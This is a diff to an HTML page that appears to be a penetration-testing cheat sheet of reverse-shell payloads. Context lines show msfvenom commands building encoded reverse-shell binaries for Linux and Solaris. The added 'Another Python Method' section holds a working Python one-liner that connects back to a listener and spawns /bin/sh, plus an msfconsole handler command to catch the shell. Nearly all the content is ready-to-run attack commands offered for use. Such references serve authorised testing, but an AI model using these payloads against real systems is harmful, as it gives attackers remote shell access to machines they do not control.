@@ -297,6 +297,12 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f e
 <h4 id="sunos-solaris"><a class="header" href="#sunos-solaris">SunOS (Solaris)</a></h4>
 <pre><code>msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf -e x86/shikata_ga_nai -b '\x00' &gt; solshell.elf
 </code></pre>
+<h4 id="another-python-method"><a class="header" href="#another-python-method">Another Python Method</a></h4>
+<pre><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+
+
+msfconsole -q -x "use multi/handler; set payload cmd/unix/reverse_python; set lhost 192.168.45.222; set lport 4444; exploit"
+</code></pre>
 <h3 id="web-based-payloads"><a class="header" href="#web-based-payloads"><ins>Web-Based Payloads</ins></a></h3>
 <h4 id="php"><a class="header" href="#php"><strong>PHP</strong></a></h4>
 <h5 id="reverse-shell-2"><a class="header" href="#reverse-shell-2">Reverse shel<strong>l</strong></a></h5>
